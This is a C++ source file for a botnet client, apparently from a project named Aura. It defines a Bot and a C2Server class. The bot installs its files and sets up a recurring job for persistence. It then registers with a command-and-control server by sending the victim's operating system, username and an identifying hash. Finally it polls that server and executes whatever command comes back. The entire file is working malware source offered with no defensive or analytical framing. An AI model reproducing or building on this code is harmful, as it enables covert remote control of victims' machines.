#include <memory>
#include <string>

#include "command.hh"
#include "constants.hh"
#include "request.hh"
#include "seed.hh"
#include "system.hh"

class C2Server {
   public:
    C2Server(const std::string& registerUrl, const std::string& cmdUrl) {
        _registerUrl = registerUrl;
        _cmdUrl = cmdUrl;
    }

    std::string getRegisterUrl() { return _registerUrl; }
    std::string getCmdUrl() { return _cmdUrl; }

   private:
    std::string _registerUrl, _cmdUrl;
};

class Bot {
   public:
    Bot(const std::string& seedPath, const std::string& regUrl,
        const std::string& cmdUrl) {
        _hashType = HASH_TYPE;
        _seed = std::make_unique<Seed>(seedPath);
        _c2Server = std::make_unique<C2Server>(regUrl, cmdUrl);
    }

    void init();
    bool isInit();
    void registerBot();
    void executeCommand();

   private:
    std::string _hashType, _hashSum, _os, _user;
    std::unique_ptr<Seed> _seed;
    std::unique_ptr<C2Server> _c2Server;

    void _prepareSysInfo();
};

void Bot::init() {
    // Install files and components
    install::installFiles();
    _seed->initSeed();
    registerBot();
    install::initRecurringJob();
}

bool Bot::isInit() { return _seed->exists(); }

void Bot::registerBot() {
    // Register bot with C2 server
    _prepareSysInfo();
    request::PostForm postForm;
    postForm.addField("version", AURA_VERSION);
    postForm.addField("hash_type", _hashType);
    postForm.addField("hash_sum", _hashSum);
    postForm.addField("operating_sys", _os);
    postForm.addField("user", _user);
    request::post(_c2Server->getRegisterUrl(), postForm.toString());
}

void Bot::executeCommand() {
    // Update system info and create POST form
    _prepareSysInfo();
    request::PostForm postForm;
    postForm.addField("version", AURA_VERSION);
    postForm.addField("hash_sum", _hashSum);

    std::string response =
        request::post(_c2Server->getCmdUrl(), postForm.toString());

    // Parse response and execute based on parameters
    Command cmd(response);
    cmd.execute();
}

void Bot::_prepareSysInfo() {
    // Init or retrieve seed
    if (_seed->exists()) {
        _seed->getSeed();
    } else {
        _seed->initSeed();
    }

    // Retrieve values if they haven't been already
    if (!(_hashSum.size())) {
        _hashSum = _seed->getHash();
    }
    if (!(_os.size())) {
        _os = util::getOS();
    }
    if (!(_user.size())) {
        _user = util::getUser();
    }
}